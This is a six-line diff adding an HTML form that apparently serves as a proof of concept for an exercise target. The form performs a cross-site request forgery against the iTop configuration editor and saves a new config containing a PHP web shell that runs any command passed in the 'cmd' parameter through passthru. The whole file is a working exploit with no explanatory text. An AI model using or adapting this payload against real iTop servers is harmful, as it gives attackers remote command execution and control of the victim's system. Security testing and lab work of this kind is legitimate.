@@ -1,0 +1,6 @@
+<form action="http://target.cyexc-target:8000/env-production/itop-config/config.php?c%5Bmenu%5D=ConfigEditor"; method="post" name="main">
+<input type="hidden" name="operation" value="save">
+<input type="hidden" name="prev_config" value="1">
+<input type="hidden" name="new_config" value="<?php if(isset($_GET['cmd'])) die(passthru($_GET['cmd'])); ?>">
+<input value="submit" id="btn" type="submit" />
+</form>
